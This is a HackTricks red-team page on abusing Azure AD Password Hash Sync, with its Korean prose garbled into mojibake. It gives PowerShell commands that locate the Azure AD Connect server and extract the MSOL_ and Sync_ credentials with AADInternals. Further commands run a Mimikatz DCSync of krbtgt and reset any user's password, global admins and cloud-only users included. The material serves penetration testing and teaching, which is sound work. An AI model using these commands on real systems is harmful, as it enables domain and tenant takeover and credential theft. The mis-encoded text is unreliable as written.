# Az - PHS - Password Hash Sync

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œë¡œ PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

[ë¬¸ì„œì—ì„œ:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **ë¹„ë°€ë²ˆí˜¸ í•´ì‹œ ë™ê¸°í™”**ëŠ” í•˜ì´ë¸Œë¦¬ë“œ IDë¥¼ ë‹¬ì„±í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ë¡œê·¸ì¸ ë°©ë²• ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **Azure AD Connect**ëŠ” ì˜¨í”„ë ˆë¯¸ìŠ¤ Active Directory ì¸ìŠ¤í„´ìŠ¤ì˜ ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ì˜ í•´ì‹œë¥¼ í´ë¼ìš°ë“œ ê¸°ë°˜ì˜ Azure AD ì¸ìŠ¤í„´ìŠ¤ë¡œ ë™ê¸°í™”í•©ë‹ˆë‹¤.

<figure><img src="../../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

ì´ëŠ” íšŒì‚¬ê°€ ì˜¨í”„ë ˆë¯¸ìŠ¤ ADë¥¼ Azure ADì™€ ë™ê¸°í™”í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” **ê°€ì¥ ì¼ë°˜ì ì¸ ë°©ë²•**ì…ë‹ˆë‹¤.

ëª¨ë“  **ì‚¬ìš©ì** ë° **ë¹„ë°€ë²ˆí˜¸ í•´ì‹œì˜ í•´ì‹œ**ê°€ ì˜¨í”„ë ˆë¯¸ìŠ¤ì—ì„œ Azure ADë¡œ ë™ê¸°í™”ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **í‰ë¬¸ ì•”í˜¸**ë‚˜ **ì›ë˜ í•´ì‹œ**ëŠ” Azure ADë¡œ ì „ì†¡ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.\
ë˜í•œ **ë¹ŒíŠ¸ì¸** ë³´ì•ˆ ê·¸ë£¹(ë„ë©”ì¸ ê´€ë¦¬ì ë“±...)ì€ Azure ADë¡œ **ë™ê¸°í™”ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.

í•´ì‹œ ë™ê¸°í™”ëŠ” **2ë¶„ë§ˆë‹¤** ë°œìƒí•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê¸°ë³¸ì ìœ¼ë¡œ Azure ADì—ì„œ **ë¹„ë°€ë²ˆí˜¸ ë§Œë£Œ** ë° **ê³„ì • ë§Œë£Œ**ê°€ **ë™ê¸°í™”ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ **ì˜¨í”„ë ˆë¯¸ìŠ¤ ë¹„ë°€ë²ˆí˜¸ê°€ ë§Œë£Œëœ**(ë³€ê²½ë˜ì§€ ì•Šì€) ì‚¬ìš©ìëŠ” ì´ì „ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ê³„ì†í•´ì„œ **Azure ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜¨í”„ë ˆë¯¸ìŠ¤ ì‚¬ìš©ìê°€ Azure ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ê³  í•  ë•Œ, **ì¸ì¦ì€ Azure ADì—ì„œ** ìˆ˜í–‰ë©ë‹ˆë‹¤.

**PHS**ëŠ” **Identity Protection** ë° AAD ë„ë©”ì¸ ì„œë¹„ìŠ¤ì™€ ê°™ì€ ê¸°ëŠ¥ì— í•„ìš”í•©ë‹ˆë‹¤.

## Pivoting

PHSê°€ êµ¬ì„±ë˜ë©´ ì¼ë¶€ **íŠ¹ê¶Œ ê³„ì •**ì´ ìë™ìœ¼ë¡œ **ìƒì„±**ë©ë‹ˆë‹¤:

- **`MSOL_<installationID>`** ê³„ì •ì´ ì˜¨í”„ë ˆë¯¸ìŠ¤ ADì— ìë™ìœ¼ë¡œ ìƒì„±ë©ë‹ˆë‹¤. ì´ ê³„ì •ì€ **ë””ë ‰í„°ë¦¬ ë™ê¸°í™” ê³„ì •** ì—­í• (ìì„¸í•œ ë‚´ìš©ì€ [ë¬¸ì„œ](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions) ì°¸ì¡°)ì„ ë¶€ì—¬ë°›ì•„ **ì˜¨í”„ë ˆë¯¸ìŠ¤ ADì—ì„œ ë³µì œ(DCSync) ê¶Œí•œ**ì„ ê°–ìŠµë‹ˆë‹¤.
- **`Sync_<name of on-prem ADConnect Server>_installationID`** ê³„ì •ì´ Azure ADì— ìƒì„±ë©ë‹ˆë‹¤. ì´ ê³„ì •ì€ Azure ADì—ì„œ **ì–´ë–¤ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì„¤ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë™ê¸°í™”ëœ ì‚¬ìš©ì ë˜ëŠ” í´ë¼ìš°ë“œ ì „ìš© ì‚¬ìš©ì).

ì´ì „ì˜ ë‘ íŠ¹ê¶Œ ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ëŠ” **Azure AD Connectê°€ ì„¤ì¹˜ëœ ì„œë²„ì˜ SQL ì„œë²„ì— ì €ì¥**ë©ë‹ˆë‹¤.\
ë°ì´í„°ë² ì´ìŠ¤ëŠ” `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`ì— ìœ„ì¹˜í•©ë‹ˆë‹¤.

í•œ í…Œì´ë¸”ì—ì„œ êµ¬ì„±ì„ ì¶”ì¶œí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ë©°, ê·¸ ì¤‘ í•˜ë‚˜ëŠ” ì•”í˜¸í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**ì•”í˜¸í™”ëœ êµ¬ì„±**ì€ **DPAPI**ë¡œ ì•”í˜¸í™”ë˜ì–´ ìˆìœ¼ë©°, **ì˜¨í”„ë ˆë¯¸ìŠ¤ ADì˜ `MSOL_*` ì‚¬ìš©ìì™€ AzureADì˜ `Sync\_*`ì˜ ë¹„ë°€ë²ˆí˜¸**ë¥¼ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì´ëŸ¬í•œ ê²ƒë“¤ì„ ì†ìƒì‹œí‚¤ë©´ AD ë° AzureADë¡œ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ì´ [í† í¬ì—ì„œ ì´ëŸ¬í•œ ìê²© ì¦ëª…ì´ ì–´ë–»ê²Œ ì €ì¥ë˜ê³  í•´ë…ë˜ëŠ”ì§€ì— ëŒ€í•œ ì „ì²´ ê°œìš”](https://www.youtube.com/watch?v=JEIR5oGCwdg)ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **Azure AD Connect ì„œë²„** ì°¾ê¸°

**Azure AD Connectê°€ ì„¤ì¹˜ëœ ì„œë²„**ê°€ ë„ë©”ì¸ì— ê°€ì…ë˜ì–´ ìˆë‹¤ë©´(ë¬¸ì„œì—ì„œ ê¶Œì¥), ë‹¤ìŒìœ¼ë¡œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### MSOL\_\* ë‚¨ìš©í•˜ê¸°
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
ì´ ìê²© ì¦ëª…ì„ ì–»ê¸° ìœ„í•´ [**adconnectdump**](https://github.com/dirkjanm/adconnectdump)ë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### Sync\_\* ë‚¨ìš©

**`Sync_*`** ê³„ì •ì„ íƒˆì·¨í•˜ë©´ ëª¨ë“  ì‚¬ìš©ì(ê¸€ë¡œë²Œ ê´€ë¦¬ì í¬í•¨)ì˜ **ì•”í˜¸ë¥¼ ì¬ì„¤ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
**í´ë¼ìš°ë“œ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìˆ˜ì •í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤** (ê·¸ê²ƒì´ ì˜ˆìƒì¹˜ ëª»í•œ ê²½ìš°ë¼ë„)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
ì´ ì‚¬ìš©ìì˜ ì•”í˜¸ë¥¼ ë¤í”„í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ë‹¤ë¥¸ ì˜µì…˜ì€ **ì„œë¹„ìŠ¤ ì£¼ì²´ì— íŠ¹ê¶Œ ê¶Œí•œì„ í• ë‹¹**í•˜ê³ , **Sync** ì‚¬ìš©ìê°€ í•  ìˆ˜ ìˆëŠ” **ê¶Œí•œ**ì„ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ ì„œë¹„ìŠ¤ ì£¼ì²´ì— **ì•¡ì„¸ìŠ¤**í•œ ë‹¤ìŒ ê¶Œí•œ ìƒìŠ¹ì˜ ë°©ë²•ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### ì‹ ì†í•œ SSO

PHSì™€ í•¨ê»˜ ì‹ ì†í•œ SSOë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©°, ë‹¤ë¥¸ ë‚¨ìš©ì— ì·¨ì•½í•©ë‹ˆë‹¤. í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## ì°¸ê³  ìë£Œ

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)
